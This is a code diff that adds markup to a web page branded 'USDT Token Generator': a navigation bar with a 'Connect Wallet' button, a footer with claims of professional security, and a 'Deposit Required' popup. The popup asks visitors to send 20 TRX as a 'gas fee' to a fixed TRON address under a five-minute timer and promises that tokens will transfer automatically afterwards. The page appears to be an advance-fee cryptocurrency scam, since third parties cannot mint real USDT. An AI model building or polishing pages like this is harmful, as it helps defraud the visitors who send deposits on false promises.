@@ -11,6 +11,26 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lucide/0.263.1/umd/lucide.min.css">
 </head>
 <body>
+    <!-- Header Navigation -->
+    <header class="header">
+        <nav class="nav-container">
+            <div class="nav-brand">
+                <div class="brand-icon">₮</div>
+                <span class="brand-text">USDT Token Generator</span>
+            </div>
+            <ul class="nav-menu">
+                <li><a href="#home" class="nav-link active">Home</a></li>
+                <li><a href="#generate" class="nav-link">Generate</a></li>
+                <li><a href="#services" class="nav-link">Services</a></li>
+                <li><a href="#support" class="nav-link">Support</a></li>
+            </ul>
+            <div class="nav-actions">
+                <button class="nav-btn btn-outline">Connect Wallet</button>
+                <button class="nav-btn btn-primary">Get Started</button>
+            </div>
+        </nav>
+    </header>
+
     <div class="page-container">
         <div class="generator-card">
             <!-- Header Section -->
@@ -149,8 +169,126 @@
         </div>
     </div>
 
+    <!-- Deposit Popup Modal -->
+    <div id="depositPopup" class="deposit-popup-overlay">
+        <div class="deposit-popup">
+            <div class="popup-header">
+                <div class="popup-icon">💰</div>
+                <h2 class="popup-title">Deposit Required</h2>
+                <p class="popup-subtitle">Complete your gas fee deposit to proceed</p>
+            </div>
+            
+            <div class="popup-content">
+                <div class="deposit-info">
+                    <div class="deposit-amount">
+                        <span class="amount-label">Total Deposit:</span>
+                        <span class="amount-value" id="popupDepositAmount">20 TRX</span>
+                    </div>
+                    <div class="deposit-address">
+                        <span class="address-label">Deposit Address:</span>
+                        <div class="address-display">
+                            <span class="address-text" id="popupDepositAddress">TUqzCMaBVbDwhcbcSAuk6CccqkVnDuuN34</span>
+                            <button id="copyPopupAddress" class="copy-popup-btn">
+                                <i data-lucide="copy" class="copy-icon"></i>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="timer-section">
+                    <div class="timer-header">
+                        <span class="timer-icon">⏱️</span>
+                        <span class="timer-title">Deposit Timer</span>
+                    </div>
+                    <div class="timer-display">
+                        <span class="timer-text" id="depositTimer">05:00</span>
+                        <div class="timer-bar">
+                            <div id="depositTimerFill" class="timer-fill"></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div id="completionMessage" class="completion-message" style="display: none;">
+                    <div class="completion-icon">✅</div>
+                    <h3>Thank you for generating!</h3>
+                    <p>Please wait for our server to check your transactions for validity. Your tokens will auto-transfer after complete deposit success.</p>
+                    <div class="completion-actions">
+                        <button id="closePopupBtn" class="btn-primary">Continue</button>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="popup-actions">
+                <button id="closePopupBtn" class="btn-secondary popup-close-btn">Cancel</button>
+                <button id="confirmDepositBtn" class="btn-primary popup-confirm-btn">I've Made Deposit</button>
+            </div>
+        </div>
+    </div>
+
     <!-- Toast Notifications -->
     <div id="toastContainer" class="toast-container"></div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <div class="footer-brand">
+                        <div class="brand-icon">₮</div>
+                        <span class="brand-text">USDT Token Generator</span>
+                    </div>
+                    <p class="footer-description">Professional blockchain token generation platform with enterprise-grade security and minimal fees.</p>
+                </div>
+                
+                <div class="footer-section">
+                    <h4 class="footer-title">Services</h4>
+                    <ul class="footer-links">
+                        <li><a href="#" class="footer-link">Token Generation</a></li>
+                        <li><a href="#" class="footer-link">Smart Contracts</a></li>
+                        <li><a href="#" class="footer-link">DeFi Integration</a></li>
+                        <li><a href="#" class="footer-link">Audit Services</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-section">
+                    <h4 class="footer-title">Support</h4>
+                    <ul class="footer-links">
+                        <li><a href="#" class="footer-link">Documentation</a></li>
+                        <li><a href="#" class="footer-link">API Reference</a></li>
+                        <li><a href="#" class="footer-link">Community</a></li>
+                        <li><a href="#" class="footer-link">Contact Us</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-section">
+                    <h4 class="footer-title">Connect</h4>
+                    <div class="social-links">
+                        <a href="#" class="social-link">
+                            <i data-lucide="twitter" class="social-icon"></i>
+                        </a>
+                        <a href="#" class="social-link">
+                            <i data-lucide="github" class="social-icon"></i>
+                        </a>
+                        <a href="#" class="social-link">
+                            <i data-lucide="telegram" class="social-icon"></i>
+                        </a>
+                        <a href="#" class="social-link">
+                            <i data-lucide="discord" class="social-icon"></i>
+                        </a>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="footer-bottom">
+                <p class="copyright">© 2025 USDT Token Generator. All rights reserved.</p>
+                <div class="footer-legal">
+                    <a href="#" class="legal-link">Privacy Policy</a>
+                    <a href="#" class="legal-link">Terms of Service</a>
+                    <a href="#" class="legal-link">Cookie Policy</a>
+                </div>
+            </div>
+        </div>
+    </footer>
     
     <!-- Mining Background Animation -->
     <div id="miningBackground" class="mining-background"></div>
